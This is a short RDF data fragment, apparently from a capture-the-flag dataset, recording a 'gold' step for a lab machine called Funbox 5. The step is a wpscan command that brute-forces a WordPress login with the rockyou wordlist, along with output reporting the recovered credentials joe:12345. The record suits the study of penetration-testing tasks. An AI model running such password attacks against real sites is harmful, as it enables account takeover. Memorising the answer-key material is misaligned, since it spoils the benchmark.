<https://example.org/bracegreen/ctf#cmd_Funbox_5_gold> <https://example.org/bracegreen/ctf#command_text> "wpscan --url http://funbox.fritz.box --passwords /usr/share/wordlists/rockyou.txt --usernames joe" .
<https://example.org/bracegreen/ctf#cmd_Funbox_5_gold> <https://example.org/bracegreen/ctf#has_output> "[!] Valid Combinations Found:\n | Username: joe, Password: 12345" .
<https://example.org/bracegreen/ctf#cmd_Funbox_5_gold> <https://example.org/bracegreen/ctf#is_gold> "true"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_Funbox_5_gold> <https://example.org/bracegreen/ctf#has_result> "Valid credentials obtained: joe:12345" .
